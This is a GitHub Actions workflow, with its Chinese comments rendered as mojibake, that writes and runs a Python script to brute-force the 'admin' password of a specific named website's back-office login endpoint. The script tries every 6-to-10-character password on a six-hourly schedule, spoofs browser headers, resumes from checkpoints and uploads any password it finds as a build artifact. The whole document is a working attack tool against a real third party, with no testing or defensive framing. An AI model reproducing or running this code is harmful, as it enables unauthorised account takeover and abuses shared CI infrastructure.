name: Password Brute Force Complete

on:
  workflow_dispatch:  # å…è®¸æ‰‹åŠ¨è§¦å‘
  schedule:
    - cron: '0 */6 * * *'  # æ¯6å°æ—¶è¿è¡Œä¸€æ¬¡

jobs:
  brute-force:
    runs-on: ubuntu-latest
    timeout-minutes: 280  # æŽ¥è¿‘GitHubçš„6å°æ—¶é™åˆ¶
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.9'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install requests

    - name: Create brute force script
      run: |
        cat > brute_force.py << 'EOF'
        import random
        import string
        import requests
        import json
        import time
        import os
        import itertools

        # æ‰€æœ‰å¯èƒ½çš„å­—ç¬¦é›†ï¼ˆå­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼‰
        ALL_CHARS = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
        print(f"å­—ç¬¦é›†å¤§å°: {len(ALL_CHARS)}")

        # ä»Žæ£€æŸ¥ç‚¹æ¢å¤
        def get_checkpoint():
            if os.path.exists("checkpoint.txt"):
                with open("checkpoint.txt", "r") as f:
                    line = f.readline().strip()
                    if line and "|" in line:
                        parts = line.split("|")
                        if len(parts) == 2:
                            try:
                                return int(parts[0]), int(parts[1])
                            except ValueError:
                                pass
            return (6, 0)  # é»˜è®¤ä»Žé•¿åº¦6ï¼Œç´¢å¼•0å¼€å§‹

        # ä¿å­˜æ£€æŸ¥ç‚¹
        def save_checkpoint(length, index):
            with open("checkpoint.txt", "w") as f:
                f.write(f"{length}|{index}")

        # å°è¯•ç™»å½•çš„å‡½æ•°
        def try_login(password):
            url = "https://zank666api.icu/proxy/api/back/back-user/login"
            
            headers = {
                "Host": "zank666api.icu",
                "Content-Type": "application/json;charset=utf-8",
                "Origin": "https://zank666api.icu",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
                "Referer": "https://zank666api.icu/",
                "Accept-Language": "zh-CN,zh-Hans;q=0.9"
            }
            
            data = {
                "password": password,
                "userName": "admin"
            }

            try:
                response = requests.post(url, headers=headers, data=json.dumps(data), timeout=15)
                
                # è®°å½•å°è¯•
                with open("attempt_log.txt", "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {password} - {response.status_code}\n")

                # æˆåŠŸåˆ¤æ–­æ¡ä»¶
                if response.status_code == 200:
                    success_conditions = [
                        "token" in response.text.lower(),
                        "success" in response.text.lower(),
                        "æˆåŠŸ" in response.text,
                        '"code":200' in response.text,
                        '"success":true' in response.text
                    ]
                    if any(success_conditions):
                        print(f"âœ… ç™»å½•æˆåŠŸ! å¯†ç æ˜¯: {password}")
                        print(f"å“åº”å†…å®¹: {response.text[:200]}...")
                        with open("password.txt", "w") as f:
                            f.write(password)
                        with open("success_log.txt", "a") as f:
                            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - æˆåŠŸå¯†ç : {password}\n")
                        return True
                
                return False

            except requests.exceptions.RequestException as e:
                print(f"è¯·æ±‚é”™è¯¯: {e}")
                with open("error_log.txt", "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {password} - é”™è¯¯: {e}\n")
                return False

        # æŒ‰ç´¢å¼•ç”Ÿæˆç‰¹å®šä½ç½®çš„å¯†ç 
        def generate_password_by_index(length, index):
            """æ ¹æ®ç´¢å¼•ç”ŸæˆæŒ‡å®šä½ç½®çš„å¯†ç """
            password = []
            n = index
            for _ in range(length):
                password.append(ALL_CHARS[n % len(ALL_CHARS)])
                n //= len(ALL_CHARS)
            return ''.join(password)

        def main():
            print("å¼€å§‹å®Œæ•´å¯†ç ç©ºé—´çˆ†ç ´...")
            print("=" * 50)
            
            # ä»Žæ£€æŸ¥ç‚¹æ¢å¤
            start_length, start_index = get_checkpoint()
            print(f"ä»Žæ£€æŸ¥ç‚¹æ¢å¤: é•¿åº¦={start_length}, ç´¢å¼•={start_index}")
            
            found = False
            total_tried = 0
            start_time = time.time()
            
            # æŒ‰é•¿åº¦é¡ºåºå°è¯•
            for length in range(start_length, 11):  # 6-10ä½
                total_passwords = len(ALL_CHARS) ** length
                print(f"å¼€å§‹å°è¯•é•¿åº¦ {length} çš„å¯†ç ï¼Œå…± {total_passwords:,} ç§ç»„åˆ")
                
                # è®¡ç®—èµ·å§‹ç´¢å¼•
                start_idx = start_index if length == start_length else 0
                
                for index in range(start_idx, total_passwords):
                    if found:
                        break
                        
                    password = generate_password_by_index(length, index)
                    total_tried += 1
                    
                    # æ¯1000æ¬¡å°è¯•æ˜¾ç¤ºè¿›åº¦
                    if total_tried % 1000 == 0:
                        elapsed = time.time() - start_time
                        rate = total_tried / elapsed if elapsed > 0 else 0
                        print(f"å·²å°è¯• {total_tried:,} æ¬¡å¯†ç ï¼Œé€ŸçŽ‡: {rate:.2f} æ¬¡/ç§’ï¼Œå½“å‰: {password}")
                        save_checkpoint(length, index)
                    
                    # å°è¯•ç™»å½•
                    if try_login(password):
                        found = True
                        break
                    
                    # æ·»åŠ å»¶è¿Ÿé¿å…è¯·æ±‚è¿‡å¿«
                    if total_tried % 50 == 0:
                        time.sleep(0.5)
                
                if found:
                    break
                    
                # é‡ç½®èµ·å§‹ç´¢å¼•ä¸º0ï¼Œä»¥ä¾¿ä¸‹ä¸€ä¸ªé•¿åº¦ä»Žå¼€å§‹å°è¯•
                save_checkpoint(length + 1, 0)
                print(f"å®Œæˆé•¿åº¦ {length} çš„æ‰€æœ‰å¯†ç å°è¯•")
            
            return found

        if __name__ == "__main__":
            start_time = time.time()
            found = main()
            end_time = time.time()
            
            print("=" * 50)
            if found:
                print(f"ðŸŽ‰ çˆ†ç ´æˆåŠŸ!")
            else:
                print("âŒ çˆ†ç ´å¤±è´¥ï¼Œæœªæ‰¾åˆ°æ­£ç¡®å¯†ç ")
            print(f"æ€»è€—æ—¶: {end_time - start_time:.2f} ç§’")
            print(f"æ€»å°è¯•æ¬¡æ•°: {total_tried}")
        EOF

    - name: Create necessary files
      run: |
        touch attempt_log.txt error_log.txt
        # åˆå§‹åŒ–æ£€æŸ¥ç‚¹æ–‡ä»¶ï¼ˆå¦‚æžœä¸å­˜åœ¨ï¼‰
        if [ ! -f "checkpoint.txt" ]; then
          echo "6|0" > checkpoint.txt
        fi

    - name: Run brute force
      run: |
        echo "å¼€å§‹è¿è¡Œçˆ†ç ´è„šæœ¬..."
        # è®¾ç½®è¶…æ—¶æ—¶é—´ä¸º275åˆ†é’Ÿï¼ˆ4å°æ—¶35åˆ†é’Ÿï¼‰
        timeout 275m python brute_force.py || echo "è¿è¡Œå®Œæˆæˆ–è¶…æ—¶"
        echo "çˆ†ç ´è„šæœ¬è¿è¡Œç»“æŸ"

    - name: Check if password found
      id: check_password
      run: |
        if [ -f "password.txt" ]; then
          echo "PASSWORD_FOUND=true" >> $GITHUB_OUTPUT
          echo "å¯†ç å·²æ‰¾åˆ°: $(cat password.txt)"
          echo "ðŸŽ‰ å¯†ç çˆ†ç ´æˆåŠŸ! å¯†ç : $(cat password.txt)" >> $GITHUB_STEP_SUMMARY
        else
          echo "PASSWORD_FOUND=false" >> $GITHUB_OUTPUT
          echo "æœ¬è½®æœªæ‰¾åˆ°å¯†ç "
          echo "ðŸ“Š æœ¬è½®è¿è¡Œå®Œæˆï¼Œç»§ç»­ä¸‹ä¸€è½®..." >> $GITHUB_STEP_SUMMARY
          # æ˜¾ç¤ºå½“å‰æ£€æŸ¥ç‚¹
          if [ -f "checkpoint.txt" ]; then
            echo "å½“å‰æ£€æŸ¥ç‚¹: $(cat checkpoint.txt)" >> $GITHUB_STEP_SUMMARY
          fi
        fi

    - name: Upload results
      uses: actions/upload-artifact@v4
      with:
        name: brute-force-results
        path: |
          password.txt
          success_log.txt
          attempt_log.txt
          error_log.txt
          checkpoint.txt
        if-no-files-found: ignore

    - name: Show attempt statistics
      run: |
        if [ -f "attempt_log.txt" ]; then
          attempt_count=$(wc -l < attempt_log.txt)
          echo "æœ¬è½®å°è¯•æ¬¡æ•°: $attempt_count" >> $GITHUB_STEP_SUMMARY
          echo "æœ€åŽå°è¯•çš„å¯†ç :" >> $GITHUB_STEP_SUMMARY
          tail -5 attempt_log.txt >> $GITHUB_STEP_SUMMARY
        fi
        echo "è¿è¡Œå®Œæˆæ—¶é—´: $(date)" >> $GITHUB_STEP_SUMMARY